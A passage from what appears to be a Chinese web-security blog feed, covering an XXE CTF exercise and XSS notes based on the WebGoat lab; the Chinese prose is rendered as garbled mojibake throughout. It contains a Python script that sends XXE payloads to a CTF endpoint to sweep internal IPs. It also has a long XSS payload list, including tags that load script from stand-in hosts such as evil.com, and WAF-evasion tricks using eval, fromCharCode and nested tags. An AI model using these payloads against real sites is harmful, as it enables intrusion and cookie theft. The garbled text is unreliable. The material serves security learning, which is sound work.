‘ï¼‰çš„ä¿¡æ¯ã€‚å…¶ä½œç”¨æ˜¯é«˜æ•ˆåœ°å­˜å‚¨å’ŒæŸ¥æ‰¾è·¯ç”±è¡¨é¡¹ã€‚å®ƒä»¥ä¸€ç§å‰ç¼€æ ‘çš„å½¢å¼ç»„ç»‡äº†è·¯ç”±è¡¨é¡¹ï¼Œå…¶ä¸­æ¯ä¸ªèŠ‚ç‚¹è¡¨ç¤ºä¸€ä¸ªè·¯ç”±å‰ç¼€ã€‚é€šè¿‡åœ¨æ ‘ä¸­è¿›è¡Œå‰ç¼€åŒ¹é…ï¼Œå†…æ ¸å¯ä»¥å¿«é€Ÿæ‰¾åˆ°ä¸ç›®æ ‡IPåœ°å€æœ€åŒ¹é…çš„è·¯ç”±è¡¨é¡¹ã€‚<br><img src="/2024/09/24/WebSecurity/owasptop/xmlexternalentity/image-7.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> res</span><br><span class="line">url=<span class="string">&quot;http://b32f52cd-49a3-48fa-9f8f-da51aeed0e6d.node5.buuoj.cn:81/doLogin.php&quot;</span></span><br><span class="line">rawPayload=<span class="string">&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;!DOCTYPE user [&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;!ENTITY payload1 SYSTEM &quot;http://10.244.166.&#123;&#125;&quot;&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;]&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;user&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;username&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&amp;payload1;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;/username&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;password&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;23&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;/password&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;/user&gt;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">256</span>):</span><br><span class="line">    payload=rawPayload.<span class="built_in">format</span>(i)</span><br><span class="line">    <span class="comment">#payload=rawPayload</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(<span class="string">&quot;#&#123;&#125; =&gt;&quot;</span>).<span class="built_in">format</span>(i),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        resp=res.post(url,data=payload,timeout=<span class="number">0.3</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(resp.text,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>ç”¨è„šæœ¬çˆ†ç ´å‡º</p><h2 id="CVE-2021-29447"><a href="#CVE-2021-29447" class="headerlink" title="CVE-2021-29447"></a>CVE-2021-29447</h2><p><a href="https://www.freebuf.com/vuls/272446.html">https://www.freebuf.com/vuls/272446.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Webå®‰å…¨ã€‘XSSè·¨ç«™è„šæœ¬æ”»å‡»</title>
      <link href="/2024/09/20/WebSecurity/owasptop/crosssitescripting/"/>
      <url>/2024/09/20/WebSecurity/owasptop/crosssitescripting/</url>
      
        <content type="html"><![CDATA[<p>è¿™ä¸ªç¬”è®°åŸºç¡€å†…å®¹æ˜¯åŸºäºWebGoaté¶åœºæ’°å†™çš„<br>Cross Site Scripting (XSS) <a href="https://owasp.org/www-community/attacks/xss/">https://owasp.org/www-community/attacks/xss/</a><br>XSS Filter Evasion Cheat Sheet ï¼š<a href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html</a><br>å¹²è´§ç¬”è®°ï¼ä¸€æ–‡è®²é€XSS(è·¨ç«™è„šæœ¬)æ¼æ´ <a href="https://cloud.tencent.com/developer/article/1969009">https://cloud.tencent.com/developer/article/1969009</a><br>ä»–å±±ä¹‹çŸ³ | å¯¹ XSS çš„ä¸€æ¬¡æ·±å…¥åˆ†æè®¤è¯† <a href="https://www.freebuf.com/articles/web/195507.html">https://www.freebuf.com/articles/web/195507.html</a><br>è¶…å…¨çš„xssç»•è¿‡æŠ€å·§ <a href="https://segmentfault.com/a/1190000044942572">https://segmentfault.com/a/1190000044942572</a><br>å‰ç«¯å®‰å…¨ç³»åˆ—ï¼ˆä¸€ï¼‰ï¼šå¦‚ä½•é˜²æ­¢XSSæ”»å‡»ï¼Ÿ <a href="https://segmentfault.com/a/1190000016551188">https://segmentfault.com/a/1190000016551188</a></p><p>ç›¸å…³è®ºæ–‡ï¼š</p><ul><li>Dancer in the Dark: Synthesizing and Evaluating Polyglots for Blind Cross-Site Scripting</li><li>Link: Black-Box Detection of Cross-Site Scripting Vulnerabilities Using Reinforcement Learning</li><li>Donâ€™t Trust The Locals: Investigating the Prevalence of Persistent Client-Side Cross-Site Scripting in the Wild</li></ul><h2 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h2><p>æœ€åŸºç¡€çš„éªŒè¯è¯­å¥<code>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code>ï¼Œ</p><p>XSSæœ€å¸¸å‡ºç°çš„åœ°æ–¹ï¼š</p><ul><li>Search fields that echo a search string back to the userï¼ˆå°†æœç´¢å­—ç¬¦ä¸²å›æ˜¾ç»™ç”¨æˆ·çš„æœç´¢å­—æ®µï¼‰</li><li>Input fields that echo user dataï¼ˆå›æ˜¾ç”¨æˆ·æ•°æ®çš„è¾“å…¥å­—æ®µï¼‰</li><li>Error messages that return user-supplied textï¼ˆè¿”å›ç”¨æˆ·è¾“å…¥æ–‡æœ¬çš„é”™è¯¯æ¶ˆæ¯ï¼‰</li><li>Hidden fields that contain user-supplied dataï¼ˆåŒ…å«ç”¨æˆ·æ•°æ®çš„éšè—å­—æ®µï¼‰</li><li>Any page that displays user-supplied dataï¼ˆæ˜¾ç¤ºç”¨æˆ·æ•°æ®çš„ä»»ä½•é¡µé¢ï¼‰<ul><li>Message boardsï¼ˆç•™è¨€æ¿ï¼‰</li><li>Free form commentsï¼ˆè‡ªç”±å½¢å¼è¯„è®ºï¼‰</li></ul></li><li>HTTP Headersï¼ˆHTTPå¤´éƒ¨ï¼‰</li></ul><p>XSSæ”»å‡»å¯èƒ½ä¼šå¯¼è‡´ï¼š</p><ul><li>Stealing session cookies çªƒå–ä¼šè¯cookie</li><li>Creating false requests åˆ›å»ºè™šå‡è¯·æ±‚</li><li>Creating false fields on a page to collect credentials åœ¨é¡µé¢ä¸Šåˆ›å»ºç”¨äºæ”¶é›†å‡­æ®çš„è™šå‡å­—æ®µ</li><li>Redirecting your page to a â€œnon-friendlyâ€ site å°†æ‚¨çš„é¡µé¢é‡å®šå‘åˆ°â€œä¸å‹å¥½â€çš„ç½‘ç«™</li><li>Creating requests that masquerade as a valid user åˆ›å»ºä¼ªè£…æˆæœ‰æ•ˆç”¨æˆ·çš„è¯·æ±‚</li><li>Stealing of confidential information çªƒå–æœºå¯†ä¿¡æ¯</li><li>Execution of malicious code on an end-user system (active scripting) åœ¨æœ€ç»ˆç”¨æˆ·ç³»ç»Ÿä¸Šæ‰§è¡Œæ¶æ„ä»£ç ï¼ˆä¸»åŠ¨è„šæœ¬ï¼‰</li><li>Insertion of hostile and inappropriate content æ’å…¥æ•Œå¯¹å’Œä¸é€‚å½“çš„å†…å®¹</li></ul><p>XSSæ”»å‡»ç±»å‹ï¼š<br>åå°„å‹ï¼ˆReflectedï¼‰</p><ul><li>ç”¨æˆ·è¯·æ±‚ä¸­çš„æ¶æ„å†…å®¹é€šè¿‡Webæµè§ˆå™¨æ˜¾ç¤ºç»™ç”¨æˆ·</li><li>æœåŠ¡å™¨å“åº”åï¼Œæ¶æ„å†…å®¹è¢«å†™å…¥é¡µé¢</li><li>éœ€è¦ç¤¾äº¤å·¥ç¨‹å­¦æŠ€å·§</li><li>ä»¥ç”¨æˆ·åœ¨æµè§ˆå™¨ä¸­ç»§æ‰¿çš„æµè§ˆå™¨æƒé™è¿è¡Œ<br><img src="/2024/09/20/WebSecurity/owasptop/crosssitescripting/image.png"></li></ul><p>DOM-basedï¼ˆæŠ€æœ¯ä¸Šä¹Ÿå±äºåå°„å‹ï¼‰</p><ul><li>å®¢æˆ·ç«¯è„šæœ¬ä½¿ç”¨ç”¨æˆ·è¯·æ±‚ä¸­çš„æ¶æ„å†…å®¹å°†HTMLå†™å…¥å…¶é¡µé¢</li><li>ç±»ä¼¼äºåå°„å‹XSS</li><li>ä»¥ç”¨æˆ·åœ¨æµè§ˆå™¨ä¸­ç»§æ‰¿çš„æµè§ˆå™¨æƒé™è¿è¡Œ</li></ul><p>å­˜å‚¨å‹ï¼ˆStored or persistentï¼‰</p><ul><li>æ¶æ„å†…å®¹å­˜å‚¨åœ¨æœåŠ¡å™¨ä¸Šï¼ˆæ•°æ®åº“ã€æ–‡ä»¶ç³»ç»Ÿæˆ–å…¶ä»–å¯¹è±¡ï¼‰ï¼Œç¨åæ˜¾ç¤ºç»™ç”¨æˆ·çš„Webæµè§ˆå™¨</li><li>ä¸éœ€è¦ç¤¾äº¤å·¥ç¨‹å­¦æŠ€å·§</li></ul><p>é™¤æ­¤ä¹‹å¤–è¿˜æœ‰ä¸‹é¢è¿™äº›xssç±»åˆ«ï¼š<br>mXSSï¼šmXSSä¸­æ–‡æ˜¯çªå˜å‹XSSï¼ŒæŒ‡çš„æ˜¯åŸå…ˆçš„Payloadæäº¤æ˜¯æ— å®³ä¸ä¼šäº§ç”ŸXSSï¼Œè€Œç”±äºä¸€äº›ç‰¹æ®ŠåŸå› ï¼Œå¦‚åç¼–ç ç­‰ï¼Œå¯¼è‡´Payloadå‘ç”Ÿå˜å¼‚ï¼Œå¯¼è‡´çš„XSSã€‚ <a href="https://www.freebuf.com/articles/network/409092.html">https://www.freebuf.com/articles/network/409092.html</a><br>UXSSï¼šæ˜¯ä¸€ç§åˆ©ç”¨æµè§ˆå™¨æˆ–è€…æµè§ˆå™¨æ‰©å±•æ¼æ´æ¥åˆ¶é€ äº§ç”ŸXSSçš„æ¡ä»¶å¹¶æ‰§è¡Œä»£ç çš„ä¸€ç§æ”»å‡»ç±»å‹ã€‚UXSS å¯ä»¥ç†è§£ä¸ºBypass åŒæºç­–ç•¥ã€‚</p><h2 id="XSSçš„æ”»å‡»è½½è·"><a href="#XSSçš„æ”»å‡»è½½è·" class="headerlink" title="XSSçš„æ”»å‡»è½½è·"></a>XSSçš„æ”»å‡»è½½è·</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=http://xxx.com/xss.js&gt;&lt;/script&gt;  #å¼•ç”¨å¤–éƒ¨çš„xss</span><br><span class="line">&lt;script&gt; alert(&quot;hack&quot;)&lt;/script&gt;   #å¼¹å‡ºhack</span><br><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt; #å¼¹å‡ºcookie</span><br><span class="line"></span><br><span class="line">&lt;img  src=1  onerror=alert(&quot;hack&quot;)&gt;</span><br><span class="line">&lt;img  src=1  onerror=alert(/hack/)&gt;</span><br><span class="line">&lt;img  src=1  onerror=alert(document.cookie)&gt;  #å¼¹å‡ºcookie</span><br><span class="line">&lt;img  src=1  onerror=alert(123)&gt;      æ³¨ï¼šå¯¹äºæ•°å­—ï¼Œå¯ä»¥ä¸ç”¨å¼•å·</span><br><span class="line">&lt;img  src=&quot;javascript:alert(&quot;XSS&quot;);&quot;&gt;</span><br><span class="line">&lt;img  dynsrc=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line">&lt;img  lowsrc=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;body onload=alert(&quot;XSS&quot;)&gt;</span><br><span class="line">&lt;body background=&quot;javascript:alert(&quot;XSS&quot;)&quot;&gt;</span><br><span class="line"></span><br><span class="line">// ç”±äºæµè§ˆå™¨çš„å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰ï¼ŒiFrameä¸­çš„JavaScriptæ— æ³•è®¿é—®çˆ¶é¡µé¢çš„DOM</span><br><span class="line">&lt;iframe src=â€http://evil.com/xss.htmlâ€&gt;</span><br><span class="line"></span><br><span class="line">// åœ¨æŸäº›æµè§ˆå™¨ä¸­ï¼Œå¦‚æœæ ‡è®°çš„typeå±æ€§&lt;input&gt;è®¾ç½®ä¸ºimageï¼Œåˆ™å¯ä»¥å¯¹å…¶è¿›è¡Œæ“ä½œä»¥åµŒå…¥è„šæœ¬</span><br><span class="line">&lt;input type=&quot;image&quot; src=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;table background=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line">&lt;td background=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;div style=&quot;background-image: url(javascript:alert(&#x27;XSS&#x27;))&quot;&gt;</span><br><span class="line">&lt;div style=&quot;width: expression(alert(&#x27;XSS&#x27;));&quot;&gt;</span><br><span class="line"></span><br><span class="line">// è¯¥&lt;object&gt;æ ‡ç­¾å¯ç”¨äºä»å¤–éƒ¨ç«™ç‚¹è„šæœ¬åŒ…å«</span><br><span class="line">&lt;object type=&quot;text/x-scriptlet&quot; data=&quot;http://hacker.com/xss.html&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;style onload=alert(1) /&gt;</span><br><span class="line"></span><br><span class="line">// Marquee æ ‡ç­¾é™¤äº†åœ¨webå¼€å‘ä¸­æœ‰æ ‡ç­¾å†…å®¹å›æ»šä½œç”¨ä¹‹å¤–ï¼Œå®ƒè¿˜æ”¯æŒä¸€ç³»åˆ—çš„äº‹ä»¶å¤„ç†ç¨‹åºï¼Œå› æ­¤å¯ä»¥ç”¨å®ƒæ¥å®ç°XSS Payloadè§¦å‘ã€‚</span><br><span class="line">&lt;marquee behavior=&quot;alternate&quot; onstart=alert(1)&gt;hack the planet&lt;/marquee&gt;</span><br><span class="line">&lt;marquee loop=&quot;1&quot; onfinish=alert(1)&gt;hack the planet&lt;/marquee&gt;</span><br><span class="line">&lt;marquee onstart=alert(1)&gt;hack the planet&lt;/marquee&gt;</span><br><span class="line"></span><br><span class="line">// mediaæ ‡ç­¾</span><br><span class="line">&lt;audio oncanplay=alert(1) src=&quot;/media/hack-the-planet.mp3&quot; /&gt;  // åœ¨ç”¨æˆ·å¯ä»¥å¼€å§‹æ’­æ”¾éŸ³è§†é¢‘ï¼ˆaudio/videoï¼‰æ—¶è§¦å‘ï¼›</span><br><span class="line">&lt;audio ondurationchange=alert(1) src=&quot;/media/hack-the-planet.mp3&quot; /&gt;  // åœ¨éŸ³è§†é¢‘ï¼ˆaudio/videoï¼‰çš„æ—¶é•¿å‘ç”Ÿå˜åŒ–æ—¶è§¦å‘ï¼›</span><br><span class="line">&lt;audio autoplay=true onended=alert(1) src=&quot;/media/hack-the-planet.mp3&quot; /&gt;</span><br><span class="line">&lt;audio onloadeddata=alert(1) src=&quot;/media/hack-the-planet.mp3&quot; /&gt;</span><br><span class="line">&lt;audio onloadedmetadata=alert(1) src=&quot;/media/hack-the-planet.mp3&quot; /&gt;</span><br><span class="line">&lt;audio onloadstart=alert(1) src=&quot;/media/hack-the-planet.mp3&quot; /&gt;</span><br><span class="line">&lt;audio onprogress=alert(1) src=&quot;/media/hack-the-planet.mp3&quot; /&gt;</span><br><span class="line">&lt;audio onsuspend=alert(1) src=&quot;/media/hack-the-planet.mp3&quot; /&gt;</span><br><span class="line">&lt;video oncanplay=alert(1) src=&quot;/media/hack-the-planet.mp4&quot; /&gt;</span><br><span class="line">&lt;video ondurationchange=alert(1) src=&quot;/media/hack-the-planet.mp4&quot; /&gt;</span><br><span class="line">&lt;video autoplay=true onended=alert(1) src=&quot;/media/hack-the-planet.mp4&quot; /&gt;</span><br><span class="line">&lt;video onloadeddata=alert(1) src=&quot;/media/hack-the-planet.mp4&quot; /&gt;</span><br><span class="line">&lt;video onloadedmetadata=alert(1) src=&quot;/media/hack-the-planet.mp4&quot; /&gt;</span><br><span class="line">&lt;video onloadstart=alert(1) src=&quot;/media/hack-the-planet.mp4&quot; /&gt;</span><br><span class="line">&lt;video onprogress=alert(1) src=&quot;/media/hack-the-planet.mp4&quot; /&gt;</span><br><span class="line">&lt;video onsuspend=alert(1) src=&quot;/media/hack-the-planet.mp4&quot; /&gt;</span><br></pre></td></tr></table></figure><h2 id="XSS-ç»•è¿‡æŠ€å·§"><a href="#XSS-ç»•è¿‡æŠ€å·§" class="headerlink" title="XSS ç»•è¿‡æŠ€å·§"></a>XSS ç»•è¿‡æŠ€å·§</h2><h3 id="Eval-å…¶å®ƒå†—ä½™ç¬¦å·"><a href="#Eval-å…¶å®ƒå†—ä½™ç¬¦å·" class="headerlink" title="Eval &amp; å…¶å®ƒå†—ä½™ç¬¦å·"></a>Eval &amp; å…¶å®ƒå†—ä½™ç¬¦å·</h3><p>å¦‚æœç›®æ ‡ç³»ç»Ÿçš„WAFæˆ–å…¶å®ƒé˜²æŠ¤è½¯ä»¶æ²¡æŠŠ <code>/(eval|replace)\(.+?\)/i</code> è¿™ç§æ ·å¼åˆ—å…¥é»‘åå•ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åœ¨å…¶ä¸­é€šè¿‡å¤¹æ‚å†—ä½™ç¬¦å·çš„æ–¹å¼å½¢æˆPayloadï¼Œåˆ©ç”¨å…¶ä¸­çš„evalåŠ¨ä½œæ¥åŠ è½½Payloadï¼Œå†åˆ©ç”¨ä¹‹åçš„replaceåŠ¨ä½œæŠŠå†—ä½™ç¬¦å·è¿›è¡Œæ›¿æ¢åˆ é™¤ã€‚<br><code>eval(&#39;~a~le~rt~~(~~1~~)~&#39;.replace(/~/g, &#39;&#39;))</code><br>å½“å¼•å·è¢«è½¬ä¹‰ï¼ˆescapeï¼‰ä¹‹åï¼Œä¸ç®¡ä½¿ç”¨äº†ä»€ä¹ˆç»•è¿‡æŠ€æœ¯ï¼Œè‚¯å®šä¼šå¼•èµ·é—®é¢˜ï¼Œå°±åƒä¸Šé¢çš„<code>eval(&#39;~a~le~rt~~(~~1~~)~&#39;.replace(/~/g, &#39;&#39;))</code>ä¸€æ ·ï¼Œå¦‚æœè¦é¡ºå¸¦æŠŠå¼•å·è½¬ä¹‰ï¼Œå…¶Payloadå¯èƒ½å¦‚ä¸‹ï¼š<br><code>eval(\&#39;~a~le~rt~~(~~1~~)~\&#39;.replace(/~/g, \&#39;\&#39;))</code><br>ä½†å¦ä¸€ç§å˜æ¢æ–¹æ³•å°±æ˜¯åˆ©ç”¨æ­£åˆ™è¡¨è¾¾å¼æ¥é¿å…å¸¦å…¥å¼•å·çš„ä½¿ç”¨ï¼Œå¦‚å¯ä»¥åœ¨ä¸Šè¿°Payloadä¸­å¼•å…¥æ­£æ–œæ æ–¹å¼ï¼Œç„¶åå†ç”¨åˆ›å»ºçš„æ­£åˆ™è¡¨è¾¾å¼å¯¹è±¡å±æ€§æ¥è®¿é—®å…¶ä¸­çš„é—­åˆå­—ç¬¦ä¸²ã€‚ç¤ºä¾‹å¦‚ä¸‹ï¼š<br><code>eval(/~a~le~rt~~(~~1~~)~/.source.replace(/~/g, new String()))</code><br>ä»¥æ­¤ç”¨new String()æ¥å®ç°æŠŠ~è½¬æ¢ä¸ºç©ºå­—ç¬¦ä¸²çš„ç›®çš„ï¼Œä»è€Œä¸éœ€è¦ç”¨åˆ°å¼•å·ã€‚<br>å¯¹å¼•å·å®è¡Œè½¬ä¹‰å¹¶ç»•è¿‡WAFç±»äº§å“æ¨¡å¼åŒ¹é…è§„åˆ™çš„ä¸€ä¸ªæœ‰æ•ˆæ‰‹æ®µæ˜¯ä½¿ç”¨evalçš„String.fromCharCodeæ–¹æ³•ï¼Œè¯¥æ–¹æ³•å°†è·å–ä¸€ä¸ªæˆ–å¤šä¸ªåè¿›åˆ¶Unicodeå€¼ï¼Œç„¶åå°†å®ƒä»¬è½¬æ¢æˆç­‰æ•ˆçš„ASCIIå­—ç¬¦ï¼Œå¹¶å°†å®ƒä»¬è¿æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¦‚ï¼š<br><code>console.log(String.fromCharCode(65,66,67,68))  //åœ¨ç»ˆç«¯è¿”å›æ˜¾ç¤ºçš„æ˜¯å­—ç¬¦ä¸² &quot;ABCD&quot;</code><br>é€šè¿‡è¿™ç§å¯¹Unicodeå€¼çš„è½¬æ¢ï¼Œå¯ä»¥æŠŠç›®æ ‡å€¼ä¼ é€’ç»™evalï¼Œå› æ­¤ï¼Œå¯ä»¥æ„é€ Payloadå¦‚ä¸‹ï¼š<br><code>eval(String.fromCharCode(97,108,101,114,116,40,49,41))  //// æœ€ç»ˆæ‰§è¡Œçš„ä¼šæ˜¯ alert(1)</code></p><p>æˆ‘ä»¬ä¹Ÿå¯ä»¥é‡‡å–å…¶å®ƒæ–¹æ³•æ¥è§„é¿è¿‡æ»¤ã€‚ç”±äºå‡½æ•°å¯ä»¥å­˜å‚¨åœ¨JavaScriptçš„å˜é‡ä¸­ï¼Œæ‰€ä»¥ä¸ºäº†ä¸ç›´æ¥è°ƒç”¨evalï¼Œæˆ‘ä»¬å¯ä»¥æŠŠå®ƒåˆ†é…ç»™ä¸€ä¸ªå˜é‡ï¼Œç„¶åé—´æ¥è°ƒç”¨å®ƒï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š<br><code>var x = eval; x(&#39;alert(1)&#39;)</code><br>å¦å¤–ä¸€ç§é—´æ¥è°ƒç”¨evalçš„æ–¹æ³•æ˜¯ç”¨æ‹¬å·è¿›è¡Œæ„é€ ï¼Œå³ç”¨æ‹¬å·é—´æ¥è°ƒç”¨æ³•ï¼Œå¦‚è¡¨è¾¾å¼(1,2,3,4)è¿”å›çš„æ˜¯4ï¼Œå³æ‹¬å·ä¸­æœ€åä¸€ä¸ªï¼Œæ‰€ä»¥(1,eval)è¿”å›çš„æ˜¯å‡½æ•°evalï¼Œå…·ä½“ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(eval)    // è¿”å›å‡½æ•°eval</span><br><span class="line">(1, eval) // ä»ç„¶è¿”å›å‡½æ•°eval</span><br></pre></td></tr></table></figure><p>å› æ­¤å¯ä»¥æ„é€ ä»¥ä¸‹Payloadæ¥æ‰§è¡Œï¼š<code>(1, eval)(&#39;alert(1)&#39;)  // è¿”å› alert(1)</code><br>åŸºäºæ­¤ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨callæ–¹æ³•æ¥ç›´æ¥è°ƒç”¨ï¼Œå¦‚ä¸‹ï¼š<code>eval.call(null, &#39;alert(1)&#39;)  //è¿”å› alert(1)</code><br>å…¶æ¬¡ï¼Œå¯ä»¥å®šä¹‰ä¸€ä¸ªæ–°å‡½æ•°çš„æ–¹æ³•æ¥è§„é¿ç›´æ¥å¯¹evalçš„è°ƒç”¨ï¼Œå½“ç„¶è¿™ç§æ–¹æ³•è¿˜ä¼šæ¶‰åŠåˆ°ä¸€äº›è¯­æ³•å®šä¹‰ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function hackThePlanet () &#123;</span><br><span class="line"></span><br><span class="line">  alert(1)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åï¼Œè¿˜å¯ä»¥ç”¨åˆ›å»ºFunctionå¯¹è±¡çš„æ–¹å¼æ¥å®ç°alertè°ƒç”¨ï¼Œè¯¥å¯¹è±¡æ¥å—æ„é€ å‡½æ•°ä¸­çš„å­—ç¬¦ä¸²ä½œä¸ºå‡½æ•°å®ç°ï¼Œå¦‚ä¸‹ï¼š<code>new Function(&#39;alert(1)&#39;)()</code></p><h3 id="åˆ©ç”¨é”™è¯¯è¾“å…¥è¿‡æ»¤æœºåˆ¶å®ç°ç»•è¿‡"><a href="#åˆ©ç”¨é”™è¯¯è¾“å…¥è¿‡æ»¤æœºåˆ¶å®ç°ç»•è¿‡" class="headerlink" title="åˆ©ç”¨é”™è¯¯è¾“å…¥è¿‡æ»¤æœºåˆ¶å®ç°ç»•è¿‡"></a>åˆ©ç”¨é”™è¯¯è¾“å…¥è¿‡æ»¤æœºåˆ¶å®ç°ç»•è¿‡</h3><p>åˆ é™¤æœºåˆ¶ï¼š<br>ä¹Ÿå¯èƒ½ä¼šåˆ çš„ä¸å¹²å‡€ï¼Œå¦‚ä¸‹æ˜¯å¸¸è§çš„ç»•è¿‡æ–¹å¼ï¼š<code>&lt;sc&lt;script&gt;ript&gt;alert(1)&lt;/sc&lt;/script&gt;ript&gt;</code><br>ä¸Šè¿°javascriptä¸­ï¼Œå¦‚æœè¿‡æ»¤å™¨åªæ˜¯ç®€å•åœ°æŠŠ<code>&lt;script&gt;</code>å’Œ <code>&lt;/script&gt;</code> æ ‡ç­¾å¯¹åˆ é™¤äº†ï¼Œé‚£ä¹ˆæœ€ç»ˆä¼šå‰©ä¸‹ï¼š<code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br>åŒæ ·çš„æ–¹æ³•å¯ä»¥åº”ç”¨åˆ°ä¸€äº›æ ‡ç­¾å±æ€§æˆ–äº‹ä»¶å¤„ç†ç¨‹åºä¸­ï¼Œå°±åƒå¦‚æœonerroræ˜¯åˆ é™¤ç›®æ ‡ï¼Œé‚£ä¹ˆï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ ä»¥ä¸‹Payloadï¼š<code>&lt;img src=x ononerrorerror=alert(1) /&gt;</code></p><p>æ›¿æ¢æœºåˆ¶ï¼š<br>å¦‚æœç›®æ ‡ç³»ç»Ÿçš„è¿‡æ»¤å™¨ä¼šæŠŠ<code>&lt;script&gt;&lt;/script&gt;</code>æ ‡ç­¾å¯¹éƒ½è¿‡æ»¤æ›¿æ¢ä¸ºNAUGHTY_HACKERå­—æ®µï¼Œé‚£ä¹ˆï¼Œæˆ‘ä»¬æäº¤<code>&lt;script&gt;alert(1)&lt;/script&gt;</code> ä¹‹åçš„ç»“æœå°±ä¼šæ˜¯NAUGHTY_HACKERalert(1)NAUGHTY_HACKERã€‚<br>ä½†å¦‚æœæˆ‘ä»¬æŠŠ&lt;<code>script&gt;æ ‡ç­¾å¯¹çš„å£°æ˜æ”¹ä¸º&lt;script &lt;script&gt;&gt;</code> å’Œ <code>&lt;/script &lt;/script&gt;&gt;</code>è¿™ç§åµŒå¥—å¼æ 